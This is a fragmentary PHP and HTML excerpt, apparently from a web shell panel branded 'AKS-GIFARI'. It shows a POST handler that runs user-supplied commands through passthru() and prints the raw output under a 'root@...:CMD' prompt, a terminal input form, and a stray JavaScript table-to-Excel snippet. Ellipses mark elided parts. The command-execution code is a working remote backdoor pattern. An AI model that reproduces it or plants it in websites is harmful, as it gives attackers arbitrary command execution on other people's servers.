...
if (isset($_POST['terminal'])) {
    ...
    echo "<strong>root@AKS-GIFARI:CMD</strong><br><pre>";
    passthru($cmd);  // passthru sends raw output directly to the browser
    echo "</pre>";
}
?>
<form method="post" action="<?=$url_inc?>">
    <input type="text" name="terminal-text" size="20" placeholder="root@AKS-GIFARI:CMD" required>
...
var tableToExcelData = (function() {var uri = 'data:application/vnd.ms-excel;base64,',
